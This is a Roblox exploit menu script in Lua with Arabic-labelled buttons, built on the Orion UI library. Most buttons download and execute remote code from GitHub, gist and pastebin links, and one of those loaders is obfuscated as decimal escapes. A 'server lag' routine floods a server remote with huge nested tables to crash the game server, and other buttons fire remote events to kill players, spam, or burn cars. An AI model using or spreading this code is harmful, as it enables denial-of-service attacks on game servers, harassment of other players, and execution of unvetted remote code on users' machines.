local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "سكربت عربي", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
	Name = "قائمةالاولى",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Tub = Window:MakeTab({
	Name = "قائمه ثانيه",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Section"
})

local Santa = Tab:AddSection({
	Name = "Santa"
})

Tab:AddButton({
	Name = "طيران",
	Callback = function()
      		print("button pressed")
       --ARCEUS X FLY V2 SCRIPT BY me_ozoneYT
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()

  	end    
})

Tab:AddButton({
	Name = "قتل لاعب gui",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Kidnap%20again"))()

  	end    
})

Tab:AddButton({
	Name = "سبام",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./2520c121ab919b2b9697ab5c70797dcfdaa5db43/Ohio'))()
  	end    
})
Tab:AddButton({
	Name = "لاق سيرفر",
	Callback = function()
      		print("button pressed")
      local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end

end
 
bomb(289, 5) --// change values if client crashes
end
  	end    
})

Tab:AddColorpicker({
	Name = "Colorpicker",
	Default = Color3.fromRGB(255, 0, 0),
	Callback = function(Value)
		print(Value)
	end	  
})

Tab:AddButton({
	Name = "سكربت قائمهثانية",
	Callback = function()
      		print("button pressed")
     loadstring(game:HttpGet(('https://pastebin.com/raw/YCABZfZr'),true))()
  	end    
})

Tab:AddButton({
	Name = "حرق سياره",
	Callback = function()
      		print("button pressed")
      
      local args = {
    [1] = "Fire"
}
game:GetService("ReplicatedStorage").JJ3:FindFirstChild("2NN2Player2NN2sCa2NN2r"):FireServer(unpack(args))
  	end    
})

Tab:AddButton({
	Name = "كيبورد",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
  	end    
})

Tab:AddButton({
	Name = "ادمن",
	Callback = function()
      		print("button pressed")
      loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
  	end    
})
